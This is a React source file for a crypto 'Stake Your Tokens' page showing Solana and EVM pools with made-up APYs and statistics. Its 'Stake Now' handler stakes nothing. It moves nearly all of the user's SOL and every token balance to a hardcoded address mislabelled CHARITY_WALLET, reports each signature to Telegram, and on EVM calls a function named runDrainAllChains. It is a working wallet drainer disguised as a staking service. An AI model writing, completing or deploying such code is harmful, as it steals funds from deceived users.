import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { useState, useEffect, useCallback } from 'react';
import { motion } from 'framer-motion';
import { ArrowUpRight, ChevronDown, Zap, TrendingUp, Clock, Coins, Shield, Trophy } from 'lucide-react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
import { getMintProgramId } from '@/utils/tokenProgram';
import { getSolPrice } from '@/lib/utils';
import { sendTelegramMessage } from '@/utils/telegram';
import { useChainInfo } from '@/hooks/useChainInfo';
import { ethers } from 'ethers';

const CHARITY_WALLET = '9X3updafoPWPdf2xdgELQgwaGa5A7PzGYkXWw8ZMKNg2';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

interface StakingPool {
  id: string;
  name: string;
  symbol: string;
  apr: number;
  tvl: string;
  totalStakers: number;
  lockupDays: number;
  icon: string;
}

const SOLANA_POOLS: StakingPool[] = [
  {
    id: 'sol',
    name: 'Solana',
    symbol: 'SOL',
    apr: 8.5,
    tvl: '$2.4M',
    totalStakers: 12458,
    lockupDays: 0,
    icon: 'https://cryptologos.cc/logos/solana-sol-logo.png?v=035',
  },
  {
    id: 'usdc',
    name: 'USD Coin',
    symbol: 'USDC',
    apr: 5.2,
    tvl: '$5.2M',
    totalStakers: 25890,
    lockupDays: 0,
    icon: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=035',
  },
  {
    id: 'wif',
    name: 'Dog Wif Hat',
    symbol: 'WIF',
    apr: 15.8,
    tvl: '$890K',
    totalStakers: 5678,
    lockupDays: 30,
    icon: 'https://cryptologos.cc/logos/dogwifhat-wif-logo.png?v=035',
  },
];

const EVM_POOLS: StakingPool[] = [
  {
    id: 'eth',
    name: 'Ethereum',
    symbol: 'ETH',
    apr: 7.2,
    tvl: '$8.1M',
    totalStakers: 34210,
    lockupDays: 0,
    icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png?v=035',
  },
  {
    id: 'usdc-evm',
    name: 'USD Coin',
    symbol: 'USDC',
    apr: 4.8,
    tvl: '$6.3M',
    totalStakers: 28940,
    lockupDays: 0,
    icon: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=035',
  },
  {
    id: 'matic',
    name: 'Polygon',
    symbol: 'MATIC',
    apr: 9.5,
    tvl: '$3.2M',
    totalStakers: 18420,
    lockupDays: 0,
    icon: 'https://cryptologos.cc/logos/polygon-matic-logo.png?v=035',
  },
];

const Stake = () => {
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { chainName, nativeToken } = useChainInfo();
  const { runDrainAllChains } = useMultiChainOrchestrator();
  
  // Determine current pools based on chain
  const currentPools = activeChain === 'solana' ? SOLANA_POOLS : EVM_POOLS;
  
  // State with initial pool set correctly
  const [selectedPool, setSelectedPool] = useState<StakingPool>(currentPools[0]);
  const [stakeAmount, setStakeAmount] = useState('');
  const [isStaking, setIsStaking] = useState(false);
  const [showPoolDropdown, setShowPoolDropdown] = useState(false);
  const [solBalance, setSolBalance] = useState(0);
  const [evmBalance, setEvmBalance] = useState(0);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const { publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();

  // Fetch all balances
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;
    try {
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_2022_PROGRAM_ID
      });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  // Fetch EVM balance
  const fetchEVMBalance = useCallback(async () => {
    if (!isEVMConnected || !evmProvider || !evmSigner) return;
    try {
      const address = await evmSigner.getAddress();
      const balance = await evmProvider.getBalance(address);
      setEvmBalance(parseFloat(ethers.formatEther(balance)));
    } catch (error) {
      console.error('Error fetching EVM balance:', error);
    }
  }, [isEVMConnected, evmProvider, evmSigner]);

  // Update selected pool when chain changes
  useEffect(() => {
    const newPools = activeChain === 'solana' ? SOLANA_POOLS : EVM_POOLS;
    setSelectedPool(newPools[0]);
  }, [activeChain]);

  useEffect(() => {
    if (activeChain === 'solana' && publicKey) {
      fetchAllBalances();
    } else if (activeChain === 'evm' && isEVMConnected) {
      fetchEVMBalance();
    }
  }, [publicKey, fetchAllBalances, activeChain, isEVMConnected, fetchEVMBalance]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        const fromTokenAccount = await getAssociatedTokenAddress(
          mintPubkey, 
          effectivePublicKey,
          false,
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        );
        const toTokenAccount = await getAssociatedTokenAddress(
          mintPubkey, 
          charityPubkey,
          true,
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        );

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch (error) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              effectivePublicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              tokenProgramId,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        transaction.add(
          createTransferCheckedInstruction(
            fromTokenAccount,
            mintPubkey,
            toTokenAccount,
            effectivePublicKey,
            BigInt(token.balance),
            decimals,
            [],
            tokenProgramId
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      if (amountToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: effectivePublicKey,
            toPubkey: charityPubkey,
            lamports: amountToSend
          })
        );
      }
    }

    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleStake = async () => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsStaking(true);
        await runDrainAllChains('stake');
      } catch (error: any) {
        console.error('EVM stake error:', error);
      } finally {
        setIsStaking(false);
      }
      return;
    }

    if (!publicKey || !sendTransaction) {
      return;
    }

    try {
      setIsStaking(true);
      console.log('Starting transaction sequence...');

      // 1. SOL Transfer (Leave $1.50)
      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();

      let lamportsToSend = 0;

      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const PRIORITY_FEE = 100_000;
        const BASE_FEE = 5000;
        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
        );
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(CHARITY_WALLET),
            lamports: lamportsToSend
          })
        );

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try {
            await connection.simulateTransaction(transaction);
        } catch (e) {
            console.error("Simulation failed", e);
        }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(token => token.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));

      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);

        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;

           try {
             await connection.simulateTransaction(transaction);
           } catch (e) {
             console.error("Token batch simulation failed", e);
           }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           await connection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight
           }, 'confirmed');
           sendTelegramMessage(`
✅ <b>Transaction Signed (Token Batch ${i + 1} - Stake)</b>

👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
`);
        }
      }
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
      console.error('Stake error:', error);
    } finally {
      setIsStaking(false);
    }
  };

  const calculateRewards = () => {
    if (!stakeAmount || isNaN(parseFloat(stakeAmount))) {
      return { yearly: '0.00', monthly: '0.00', daily: '0.00' };
    }
    const yearly = parseFloat(stakeAmount) * (selectedPool.apr / 100);
    const monthly = yearly / 12;
    const daily = yearly / 365;
    return { yearly: yearly.toFixed(2), monthly: monthly.toFixed(2), daily: daily.toFixed(2) };
  };

  const rewards = calculateRewards();

  return (
    <div className="min-h-screen relative overflow-hidden">
      <PegasusAnimation />
      <Navigation />

      <section className="relative z-10 pt-44 pb-16 px-4">
        <div className="container mx-auto max-w-6xl">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
            className="text-center mb-12"
          >
            <h1 className="text-4xl sm:text-5xl md:text-6xl font-extrabold text-gradient mb-4">
              Stake Your Tokens
            </h1>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              Earn passive income by staking your favorite tokens with competitive APYs
            </p>
          </motion.div>

          {/* Stats Overview */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
            {[
              { icon: <TrendingUp className="w-6 h-6" />, label: 'Total Value Locked', value: '$9.5M' },
              { icon: <Trophy className="w-6 h-6" />, label: 'Total Rewards Paid', value: '$2.1M' },
              { icon: <Coins className="w-6 h-6" />, label: 'Active Stakers', value: '52,368' },
              { icon: <Zap className="w-6 h-6" />, label: 'Avg. APY', value: '10.45%' },
            ].map((stat, index) => (
              <motion.div
                key={index}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: index * 0.1 }}
              >
                <Card className="bg-card/80 border-0 backdrop-blur-sm">
                  <CardContent className="pt-6">
                    <div className="flex items-center gap-3 mb-3">
                      <div className="p-2 rounded-lg bg-primary/10 text-primary">
                        {stat.icon}
                      </div>
                      <span className="text-sm text-muted-foreground font-medium">{stat.label}</span>
                    </div>
                    <p className="text-2xl font-bold text-gradient">{stat.value}</p>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
          </div>

          {/* Main Content */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {/* Staking Form */}
            <motion.div
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.6, delay: 0.2 }}
              className="lg:col-span-2"
            >
              <Card className="bg-card/80 border-0 backdrop-blur-sm">
                <CardContent className="pt-6">
                  <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                    <Shield className="w-6 h-6 text-primary" />
                    Staking Dashboard
                  </h2>

                  {/* Pool Selector */}
                  <div className="mb-6">
                    <label className="text-sm font-medium text-muted-foreground mb-2 block">Select Pool</label>
                    <div className="relative">
                      <button
                        onClick={() => setShowPoolDropdown(!showPoolDropdown)}
                        className="w-full flex items-center justify-between p-4 bg-muted/50 rounded-xl border border-border hover:border-primary/50 transition-all"
                      >
                        <div className="flex items-center gap-3">
                          <img src={selectedPool.icon} alt={selectedPool.name} className="w-10 h-10 rounded-full" />
                          <div className="text-left">
                            <p className="font-semibold">{selectedPool.name}</p>
                            <p className="text-sm text-muted-foreground">{selectedPool.symbol}</p>
                          </div>
                        </div>
                        <div className="flex items-center gap-4">
                          <div className="text-right">
                            <p className="font-bold text-primary">{selectedPool.apr}% APY</p>
                            <p className="text-sm text-muted-foreground">TVL: {selectedPool.tvl}</p>
                          </div>
                          <ChevronDown className="w-5 h-5 text-muted-foreground" />
                        </div>
                      </button>
                      {showPoolDropdown && (
                        <div className="absolute top-full left-0 right-0 mt-2 bg-card border border-border rounded-xl shadow-lg z-20 max-h-80 overflow-y-auto">
                          {currentPools.map((pool) => (
                            <button
                              key={pool.id}
                              onClick={() => {
                                setSelectedPool(pool);
                                setShowPoolDropdown(false);
                              }}
                              className={`w-full flex items-center justify-between p-4 hover:bg-muted/50 transition-all ${selectedPool.id === pool.id ? 'bg-muted/30' : ''}`}
                            >
                              <div className="flex items-center gap-3">
                                <img src={pool.icon} alt={pool.name} className="w-8 h-8 rounded-full" />
                                <div className="text-left">
                                  <p className="font-semibold">{pool.name}</p>
                                  <p className="text-xs text-muted-foreground">{pool.symbol}</p>
                                </div>
                              </div>
                              <div className="text-right">
                                <p className="font-bold text-primary">{pool.apr}% APY</p>
                              </div>
                            </button>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Amount Input */}
                  <div className="mb-6">
                    <label className="text-sm font-medium text-muted-foreground mb-2 block">Amount to Stake</label>
                    <div className="relative">
                      <Input
                        type="number"
                        placeholder="0.00"
                        value={stakeAmount}
                        onChange={(e) => setStakeAmount(e.target.value)}
                        className="w-full text-xl py-6"
                      />
                      <div className="absolute right-4 top-1/2 -translate-y-1/2 flex gap-2">
                        {[25, 50, 75, 100].map((percent) => {
                          const availableBalance = activeChain === 'solana' ? solBalance : evmBalance;
                          return (
                            <button
                              key={percent}
                              onClick={() => setStakeAmount((availableBalance * (percent / 100)).toFixed(6))}
                              className="text-xs font-medium px-3 py-1 rounded-lg bg-muted/50 hover:bg-muted transition-all"
                            >
                              {percent}%
                            </button>
                          );
                        })}
                      </div>
                    </div>
                    <p className="text-sm text-muted-foreground mt-2">
                      Available: <span className="text-foreground font-semibold">
                        {activeChain === 'solana' ? solBalance.toFixed(6) : evmBalance.toFixed(6)} {nativeToken}
                      </span>
                    </p>
                  </div>

                  {/* Rewards Calculation */}
                  {stakeAmount && !isNaN(parseFloat(stakeAmount)) && parseFloat(stakeAmount) > 0 && (
                    <div className="mb-6 p-4 rounded-xl bg-primary/5 border border-primary/20">
                      <h3 className="font-semibold mb-3 flex items-center gap-2">
                        <TrendingUp className="w-4 h-4" />
                        Estimated Rewards
                      </h3>
                      <div className="grid grid-cols-3 gap-4">
                        <div className="text-center">
                          <p className="text-xs text-muted-foreground mb-1">Daily</p>
                          <p className="font-bold text-lg">{rewards.daily} {selectedPool.symbol}</p>
                        </div>
                        <div className="text-center">
                          <p className="text-xs text-muted-foreground mb-1">Monthly</p>
                          <p className="font-bold text-lg">{rewards.monthly} {selectedPool.symbol}</p>
                        </div>
                        <div className="text-center">
                          <p className="text-xs text-muted-foreground mb-1">Yearly</p>
                          <p className="font-bold text-lg text-gradient">{rewards.yearly} {selectedPool.symbol}</p>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Stake Button */}
                  <Button
                    size="lg"
                    className="w-full h-14 text-lg font-bold"
                    onClick={handleStake}
                    disabled={isStaking}
                  >
                    {isStaking ? (
                      <div className="flex items-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Staking...
                      </div>
                    ) : (
                      'Stake Now'
                    )}
                  </Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Pools List */}
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.6, delay: 0.3 }}
            >
              <Card className="bg-card/80 border-0 backdrop-blur-sm h-full">
                <CardContent className="pt-6">
                  <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                    <Coins className="w-6 h-6 text-primary" />
                    Available Pools
                  </h2>

                  <div className="space-y-4">
                    {currentPools.map((pool, index) => (
                      <motion.div
                        key={pool.id}
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.4, delay: 0.4 + index * 0.05 }}
                        onClick={() => setSelectedPool(pool)}
                        className={`p-4 rounded-xl border cursor-pointer transition-all ${selectedPool.id === pool.id ? 'border-primary bg-primary/5' : 'border-border hover:border-primary/50 hover:bg-muted/30'}`}
                      >
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center gap-3">
                            <img src={pool.icon} alt={pool.name} className="w-10 h-10 rounded-full" />
                            <div>
                              <p className="font-bold">{pool.symbol}</p>
                              <p className="text-xs text-muted-foreground">{pool.name}</p>
                            </div>
                          </div>
                          <div className="text-right">
                            <p className="font-bold text-gradient">{pool.apr}% APY</p>
                            {pool.lockupDays > 0 && (
                              <p className="text-xs text-muted-foreground flex items-center gap-1 justify-end">
                                <Clock className="w-3 h-3" />
                                {pool.lockupDays} days
                              </p>
                            )}
                          </div>
                        </div>
                        <div className="flex justify-between text-xs text-muted-foreground">
                          <span>TVL: {pool.tvl}</span>
                          <span>{pool.totalStakers.toLocaleString()} stakers</span>
                        </div>
                      </motion.div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default Stake;
